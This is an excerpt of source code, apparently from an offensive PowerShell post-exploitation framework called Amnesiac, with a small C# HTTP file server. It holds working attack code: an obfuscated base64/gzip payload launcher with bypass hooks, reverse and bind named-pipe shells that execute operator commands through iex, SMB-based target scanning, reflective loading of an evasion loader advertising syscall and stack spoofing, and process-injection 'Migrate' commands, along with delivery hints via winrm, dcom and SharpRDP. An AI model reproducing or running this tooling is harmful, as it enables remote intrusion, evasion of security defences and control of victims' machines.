	$decomp = "`$gz='$b64';`$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$gz));`$b=New-Object IO.Compression.GzipStream(`$a,[IO.Compression.CoMPressionMode]::deCOmPreSs);`$c=New-Object IO.MemoryStream;`$b.COpYTo(`$c);`$d=[Text.Encoding]::UTF8.GETSTrIng(`$c.ToArray());`$b.ClosE();`$a.ClosE();`$c.ClosE();" + $stealthBypass + ";[scriptblock]::Create(`$d).Invoke()"
...
function Start-Listener {
	...
	Write-Host " [+] Callback address embedded in payload: $ComputerName" -Foreground cyan
	if ($global:Detach) {
		if (-not $global:IP) {
			Write-Host " [!] No -HostIP set — using DNS hostname '$ComputerName'. If unresolvable from target network, specify: Amnesiac -NonDomain -HostIP <your-IP>" -Foreground yellow
		}
		Write-Host " [!] Scenario 1 (non-domain): reverse shell requires port 445 inbound on this machine. Consider Bind Shell instead." -Foreground yellow
	}
	Write-Output ""

	$ClientScript="`$p=New-Object System.IO.Pipes.NamedPipeClientStream('$ComputerName','$PipeName','InOut');`$r=New-Object System.IO.StreamReader(`$p);`$w=New-Object System.IO.StreamWriter(`$p);`$p.Connect(600000);`$w.WriteLine(""`$([System.Net.Dns]::GetHostByName((`$env:computerName)).HostName),`$(Get-Location),`$(whoami)"");`$w.Flush();while(`$true){`$c=`$r.ReadLine();if(`$c-eq 'exit'){break};try{`$result=iex ""`$c *>&1 | Out-String"";`$result-split '`n'|%{`$w.WriteLine(`$_.TrimEnd())}}catch{`$_.Exception.Message-split '`r?`n'|%{`$w.WriteLine(`$_)}};`$w.WriteLine('$($global:EndMarker)');`$w.Flush()}`$p.Close();`$p.Dispose()"
	
	$RawClientScript = "`$p=New-Object System.IO.Pipes.NamedPipeClientStream(""$ComputerName"",""$PipeName"",'InOut');`$r=New-Object System.IO.StreamReader(`$p);`$w=New-Object System.IO.StreamWriter(`$p);`$p.Connect(600000);`$w.WriteLine(""`$([System.Net.Dns]::GetHostByName((`$env:computerName)).HostName),`$(Get-Location),`$(whoami)"");`$w.Flush();while(`$true){`$c=`$r.ReadLine();if(`$c-eq ""exit""){break};try{`$result=iex ""`$c *>&1 | Out-String"";`$result-split ""`u{000A}""|ForEach-Object{`$w.WriteLine(`$_.TrimEnd())}}catch{`$_.Exception.Message-split ""`u{000D}`u{000A}""|ForEach-Object{`$w.WriteLine(`$_)}};`$w.WriteLine(""$($global:EndMarker)"");`$w.Flush()}`$p.Close();`$p.Dispose()"
...
while (`$true) {
	...
	try {
		`$result = Invoke-Expression "`$command *>&1 | Out-String"
...
#>
	...
	if(!$HidePayload){
		...
		elseif($chosenFormat -eq 'stealth'){
			...
			$_srvIP     = if ($global:IP) { $global:IP } else { [System.Net.Dns]::GetHostByName($env:COMPUTERNAME).HostName }
			$_dllFile   = "$_alNs.dll"
			# Build lite pipe script — no bypass code, AMSI-clean content passes unaided
			...
			Write-Host " Copy to clipboard [1] PowerShell  [2] CMD: " -ForegroundColor Yellow -NoNewline
			$_sc = (Read-Host).Trim()
...
function Print-MultiListener {
	...
	if (!$global:Detach) {
		Write-Host ""
		Write-Host " [!] Amnesiac is NOT running in -NoDomain/-Detached mode." -ForegroundColor Red
		Write-Host " [!] The payload will embed your LOCAL SID in the pipe ACL." -ForegroundColor Red
		Write-Host " [!] Remote targets will reject the connection — your local SID is not a valid network identity." -ForegroundColor Red
		Write-Host " [!] Fix: restart from a runas /netonly session with: Amnesiac -NoDomain -IP <your-IP>" -ForegroundColor Red
		Write-Host ""
	}
...
#>
	Write-Output ""
	Write-Host " [+] Bind Shell PipeName: $global:MultiPipeName" -Foreground yellow
	Write-Output ""
	$_clipPayload = $null
	if($chosenFormat -eq 'exe'){
	...
	elseif($chosenFormat -eq 'stealth'){
		...
		$_dllFile     = "$_alNs.dll"
		# Build lite pipe script — no bypass code, AMSI-clean content passes scanning unaided
		$_liteConfig = @{} + $global:PayloadConfig
		$_liteConfig.Amsi = 'none'; $_liteConfig.Etw = 'none'; $_liteConfig.Sbl = $false
	...
	if (!$NoWait) {
		Write-Host ""
		if ($global:LastSharpRDPCradleFile) {
			Write-Host " [*] Deliver: winrm computername=<IP> username=<user> password=<pass>  (preferred — no serve needed)" -ForegroundColor Cyan
			Write-Host "              dcom computername=<IP>  (no admin, needs active session — run 'serve' first)" -ForegroundColor Cyan
			Write-Host "              SharpRDP last-resort: run 'serve' first, then 'sharprdp computername=<IP> ...'" -ForegroundColor DarkGray
		}
		Write-Host " [D] Open local shell to deliver payload (returns here to start listener)" -Foreground cyan
		Write-Host " [Enter] Start listener now: " -Foreground yellow -NoNewline
		$_deliverChoice = (Read-Host).Trim()
		if ($_deliverChoice -ieq 'D') {
			Start-LocalShell
		}
	}
	...
	if (!$NoWait) {
		...
		if ($global:LastSharpRDPCradleFile) {
			...
			if ($_serveOk) {
				...
				Write-Host " [*] serve not running — DCOM and SharpRDP last-resort unavailable (winrm delivery does not need serve)" -ForegroundColor DarkGray
			}
		}
		Write-Host " [*] Pipe name: $global:MultiPipeName" -ForegroundColor Cyan
		Write-Host " [*] Listening for sessions... (Q to stop)" -Foreground yellow
		$Host.UI.RawUI.FlushInputBuffer()
		$_prevCount = $global:MultipleSessions.Count

        # If no targets configured at all, prompt now — CheckReachableHosts throws on non-domain machines
        # and Scan-WaitingTargets would silently do nothing if FinalTargets is empty.
        if (!$global:AllUserDefinedTargets -and (!$global:AllOurTargets -or @($global:AllOurTargets).Count -eq 0)) {
            Write-Host " [!] No target list configured (AD enumeration skipped on non-domain-joined machines)." -Foreground yellow
            if (!$global:Detach) {
                Write-Host " [!] Running without -Detached: pipe ACL is your LOCAL SID. Remote targets require 'Amnesiac -Detached' (sets SID=Everyone)." -Foreground yellow
                Write-Host " [!] For localhost-only testing enter '.'; for remote targets restart with: Amnesiac -Detached" -Foreground yellow
            }
            Write-Host " [?] Enter bind shell target(s) — IP/hostname, comma-separated (or Q to cancel): " -Foreground yellow -NoNewline
            $_tIn = (Read-Host).Trim()
            if ($_tIn -ieq 'q' -or $_tIn -ieq 'quit') { return }
            if ($_tIn) { $global:AllUserDefinedTargets = @($_tIn -split '\s*,\s*' | Where-Object { $_ }) }
        }
		...
		try {
			while ($true) {
				if ($Host.UI.RawUI.KeyAvailable) {
					...
					if ($_k.Character -in 'q','Q') { Write-Host ""; break }
				}
				$_probe++
				$_before = $global:MultipleSessions.Count
				$global:BindScanStatus = @{}
				Scan-WaitingTargets
				if ($Host.UI.RawUI.KeyAvailable) {
					$_k = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
					if ($_k.Character -in 'q','Q') { Write-Host ""; break }
				...
				if ($global:MultipleSessions.Count -gt $_before) {
					...
					$_targetCount = if ($global:AllUserDefinedTargets) { @($global:AllUserDefinedTargets).Count } elseif ($global:AllOurTargets) { @($global:AllOurTargets).Count } else { 1 }
					if ($_targetCount -le 1) {
						$_autoInteract = $global:MultipleSessions[$global:MultipleSessions.Count - 1]
						break
					}
				} elseif ($global:BindScanStatus -and $global:BindScanStatus.Count) {
					$_statusStr = ($global:BindScanStatus.GetEnumerator() | ForEach-Object { "$($_.Key):$($_.Value)" }) -join '  '
					$_statusColor = if ($global:BindScanStatus.Values -contains 'auth_fail') { 'Yellow' } else { 'DarkGray' }
					Write-Host "`r [~] #$_probe  $_statusStr$(' ' * 8)" -NoNewline -ForegroundColor $_statusColor
					if ($global:BindScanStatus.Values -contains 'auth_fail') {
						Write-Host "`n [!] auth_fail: SMB credentials rejected by target. Launch Amnesiac from 'runas /netonly' session." -ForegroundColor Yellow
					}
				}
				Start-Sleep -Milliseconds 500
			}
		...
		Write-Host ""
		Write-Host " [*] Listener stopped. $_total new session(s) collected." -Foreground yellow
		Write-Output ""
		if ($_autoInteract) {
			InteractWithPipeSession -PipeClient $_autoInteract.PipeClient -StreamWriter $_autoInteract.StreamWriter -StreamReader $_autoInteract.StreamReader -computerNameOnly $_autoInteract.ComputerName -PipeName $_autoInteract.PipeName -UniquePipeID $_autoInteract.UniquePipeID
		}
	}
}
...
function Scan-WaitingTargets{
    ...
    foreach ($Computer in $FinalTargets) {
        $psRunspace = [powershell]::Create().AddScript({
            ...
            # Pre-establish the SMB session so NamedPipeClientStream can authenticate.
            # In a runas /netonly session this uses the domain token automatically.
            # Suppress errors -- if IPC$ is already connected this is a no-op.
            & net use "\\$Computer\IPC`$" 2>&1 | Out-Null

            try { $pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream("$Computer", $PipeName, 'InOut') } catch { return [PSCustomObject]@{Status='error';PipeClient=$null} }
            try { $pipeClient.Connect(500) } catch {
                $pipeClient.Dispose()
                $msg = $_.Exception.Message
                # Distinguish auth failure from "pipe not found" so the operator knows
                # whether to fix credentials or wait longer for the pipe server.
                $status = if ($msg -match 'denied|logon|credentials|access') { 'auth_fail' } else { 'no_pipe' }
                return [PSCustomObject]@{Status=$status;Error=$msg;PipeClient=$null}
            }

            if (!$pipeClient.IsConnected) { $pipeClient.Dispose(); return [PSCustomObject]@{Status='no_pipe';PipeClient=$null} }
    ...
    foreach ($runspace in $runspaces) {
        if ($runspace.Handle.AsyncWaitHandle.WaitOne(5000)) {
            ...
            if ($result -and $result.PipeClient) {
                $global:MultipleSessions.Add($result)
                $global:Message += " [+] New session established [$($runspace.Computer)]`n"
            } elseif ($result) {
                if (-not $global:BindScanStatus) { $global:BindScanStatus = @{} }
                $global:BindScanStatus[$runspace.Computer] = $result.Status
            }
        } else {
            $runspace.Runspace.Stop()
            if (-not $global:BindScanStatus) { $global:BindScanStatus = @{} }
            $global:BindScanStatus[$runspace.Computer] = 'stalled'
        }
...
function InteractWithPipeSession{
	...
	while ($true) {
		...
		# Auto-deliver AmnesiacLoader on first interaction (indirect syscalls + sleep masking)
		if (-not $_loaderSent -and $global:AutoLoader -and -not [string]::IsNullOrEmpty($AmnesiacLoaderB64)) {
			$_loaderSent = $true
			$_loadCmd = "`$_la=[Reflection.Assembly]::Load([Convert]::FromBase64String('$AmnesiacLoaderB64'));`$_la.GetType('$_alNs.$_alStp').GetMethod('$_alConc',[Type[]]@([Reflection.Assembly])).Invoke(`$null,@(,`$_la))"
			$sw.WriteLine($_loadCmd)
			$sw.Flush()
			while ($true) { $_ln = $sr.ReadLine(); if ($_ln -eq $_em) { break } }
			Write-Host " [+] AmnesiacLoader active (indirect syscalls, sleep masking, call stack spoofing)" -ForegroundColor DarkGreen
		} elseif (-not $_loaderSent -and $global:AutoLoader) {
			$_loaderSent = $true
			Write-Host " [!] Auto-loader: blob not embedded — run AmnesiacLoader\Build.ps1 first" -ForegroundColor Yellow
		}
		...
		elseif ($command -eq "load loader") {
			if ([string]::IsNullOrEmpty($AmnesiacLoaderB64)) {
				...
				$loadCmd = "`$_la=[Reflection.Assembly]::Load([Convert]::FromBase64String('$AmnesiacLoaderB64'));`$_la.GetType('$_alNs.$_alStp').GetMethod('$_alConc',[Type[]]@([Reflection.Assembly])).Invoke(`$null,@(,`$_la))"
		...
		elseif ($command -match "^Migrate ps new (.+)") {
			...
			if (-not $ppid) { $ppid = 0 }
			$sw.WriteLine("`$_al=[AppDomain]::CurrentDomain.GetAssemblies()|?{`$_.GetName().Name-eq'$_alNs'}|Select-Object -First 1;`$_al.GetType('$_alNs.$_alInj').GetMethod('$_alSpwn').Invoke(`$null,@('$procPath',(iex 'New-PayloadScript'|Select-Object -ExpandProperty RawScript),$ppid))")
			$sw.Flush()
		...
		elseif ($command -match "^Migrate ps (\d+)") {
			$targetPid = $Matches[1]
			$sw.WriteLine("`$_al=[AppDomain]::CurrentDomain.GetAssemblies()|?{`$_.GetName().Name-eq'$_alNs'}|Select-Object -First 1;`$_al.GetType('$_alNs.$_alInj').GetMethod('$_alInPS').Invoke(`$null,@($targetPid,(iex 'New-PayloadScript'|Select-Object -ExpandProperty RawScript)))")
			$sw.Flush()
			while ($true) { $ln = $sr.ReadLine(); if ($ln -eq $global:EndMarker) { break }; Write-Host $ln }
			continue
		}
...
"@
	...
	if ($Command) {
		$fullCommand = "$Command *>&1 | Out-String"
		...
		while ($true) {
			...
			elseif($userCommand -ne ""){
				$fullCommand = "$userCommand *>&1 | Out-String"
				$sw.WriteLine($fullCommand)
				$sw.Flush()
			}
...
public class SimpleFileServer
{
    ...
    {
        _logPath = Path.Combine(rootDirectory, "_serve.log");
        Listener.Start();
        ...
        while (true)
        {
            ...
            using (var writer = new StreamWriter(stream))
            {
                ...
                if (string.IsNullOrEmpty(request)) { writer.Flush(); continue; }
                ...
                if (tokens[0] == "GET")
                {
                    ...
                    var clientIP = ((System.Net.IPEndPoint)client.Client.RemoteEndPoint).Address.ToString();
                    var status = File.Exists(path) ? "200" : "404";
                    var logLine = DateTime.Now.ToString("HH:mm:ss") + " " + status + " " + clientIP + " " + url + Environment.NewLine;
